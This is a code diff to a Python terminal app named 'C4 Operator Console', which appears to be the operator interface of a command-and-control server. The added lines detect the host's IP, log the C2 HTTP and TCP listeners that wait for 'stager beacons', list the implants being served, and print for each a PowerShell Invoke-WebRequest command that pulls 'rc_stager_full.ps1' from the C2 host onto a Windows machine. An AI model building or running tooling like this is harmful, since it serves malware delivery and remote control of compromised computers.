@@ -645,18 +645,31 @@ class C4Console(App):
     def on_mount(self) -> None:
         global _app_ref
         _app_ref = self
-        self._log("[bold dark_red]C4 Operator Console[/] started")
-        self._log(f"HTTP listener: [bold]0.0.0.0:{self.listen_port}[/]")
-        self._log(f"TCP  listener: [bold]0.0.0.0:{self.tcp_port}[/] (stager beacons)")
+        import socket
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            self._local_ip = s.getsockname()[0]
+            s.close()
+        except OSError:
+            self._local_ip = "0.0.0.0"
+        self._log("[bold orange3]C4 Operator Console[/] started")
+        self._log(f"C2 server:     [bold]{self._local_ip}[/]")
+        self._log(f"HTTP listener: [bold]{self._local_ip}:{self.listen_port}[/]")
+        self._log(f"TCP  listener: [bold]{self._local_ip}:{self.tcp_port}[/] (stager beacons)")
         if _SERVE_DIR:
             self._log(f"File serving:  [bold]GET /serve/<id>/<file>[/] from {_SERVE_DIR}")
             implant_dirs = sorted(
                 d.name for d in _SERVE_DIR.iterdir() if d.is_dir()
             )
             if implant_dirs:
-                self._log(f"[bold purple]Available implants ({len(implant_dirs)}):[/]")
+                self._log(f"[bold green]Available implants ({len(implant_dirs)}):[/]")
                 for name in implant_dirs:
                     self._log(f"  [cyan]{name}[/]")
+                    self._log(
+                        f"    [dim]Invoke-WebRequest -Uri http://{self._local_ip}:{self.listen_port}"
+                        f"/serve/{name}/rc_stager_full.ps1 -OutFile C:\\temp\\stager.ps1[/]"
+                    )
             else:
                 self._log("[dim]No implant instances found in serve directory.[/]")
         self._log("Waiting for beacons...\n")
